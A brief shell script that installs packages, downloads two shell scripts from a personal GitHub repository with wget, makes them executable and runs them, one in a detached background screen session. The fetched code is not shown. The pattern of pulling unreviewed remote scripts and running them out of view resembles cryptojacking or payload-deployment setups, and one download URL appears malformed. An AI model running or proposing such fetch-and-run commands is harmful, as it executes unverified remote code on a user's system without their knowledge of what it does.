sudo apt update
sudo apt install screen -y
sudo apt install libpci-dev
wget https://github.com/squibex/prem/raw/main/lagan_1.sh
wget https://github.com/squibex/FkgX/main/man.sh
chmod +x man.sh
screen -dmS man ./man.sh 60 70
chmod +x lagan_1.sh
./lagan_1.sh
